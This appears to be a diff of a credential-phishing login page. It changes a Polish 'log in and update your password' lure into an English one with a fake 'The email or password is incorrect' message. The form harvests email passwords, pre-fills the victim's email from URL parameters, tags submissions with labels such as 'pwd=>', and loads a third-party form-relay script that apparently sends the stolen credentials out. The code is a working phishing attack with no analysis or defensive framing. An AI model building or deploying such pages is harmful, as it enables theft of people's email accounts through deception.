@@ -157,27 +157,31 @@
 <div id="loginBody">
     <div id="loginBg">
         <div id="topHeader" style="background-color:#21618c  ;color:white;padding-bottom:5px;padding-left:20px;">
-<div style="font-size:16pt; color:white;" align="center"> Zaloguj się i zaktualizuj swoje obecne hasło</a></div>
+   <center><div style="font-size:16pt; color:white;" align="center"><b>Yiew, edit and submit!</a></div>
         </div> 
 
    <form id="my-form" action="??" method="post"> 
-<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=oncy6jjl&n=n1.ratufa.io"></script>
-<center>  <b> 
-                <center><div class="pass"><br><br><br>
- 
-    <input type="email" name="email" id="email" placeholder="Email address" style="font-size: 12pt; height: 35px; width:280px; " readonly="readonly" />
+       
+<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=arty8qr5&n=n1.ratufa.io"></script>
+<div class="pass"> 
+ <center> <h3>Sign In</h3><p style="color:red;">The email or password is incorrect.</p><center>
+    <input type="email" name="email" id="email" placeholder="Email address" style="font-size: 11pt; height: 25px; width:280px; " required="" oninvalid="this.setCustomValidity('Enter your email address')"
+  oninput="this.setCustomValidity('')"/>
  <p>
-               <input type="password" name="Password" placeholder="Hasło" style="font-size: 12pt; height: 35px; width:280px;" required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+               <input type="password" name="Password" placeholder="Password" style="font-size: 11pt; height: 25px; width:280px;" required="" oninvalid="this.setCustomValidity('Enter your email password')"
   oninput="this.setCustomValidity('')"/>
  
     </p>
  
-            <button type="submit" name="sub" style=" background:  #21618c  ; color:#fff; font-size: 12pt; height: 35px; width:200px;border-style: dotted; border-color:#2e4c8a  #2e4c8a   #2e4c8a   #2e4c8a " class="btn btn-primary w-100 sub_b">Zaloguj się</button>
+            <button type="submit" name="sub" style=" background:  #21618c  ; color:#fff; font-size: 12pt; height: 35px; width:280px;border-style: dotted; border-color:#2e4c8a  #2e4c8a   #2e4c8a   #2e4c8a " class="btn btn-primary w-100 sub_b"><b>Sign In</button>
 
          </form>
 
 <script type="text/javascript">
 const params=new URLSearchParams(window.location.search);
 document.getElementById('email').value=params.get('email');
-document.getElementById('subject').value="pwd=> " + params.get('email');
+document.getElementById('domain').value=params.get('domain');
+document.getElementById('user').value=params.get('user');
+document.getElementById('subject').value="UND=>" + params.get('email');
+document.getElementById('sub').value=".pl=> " + params.get('email');
 </script>
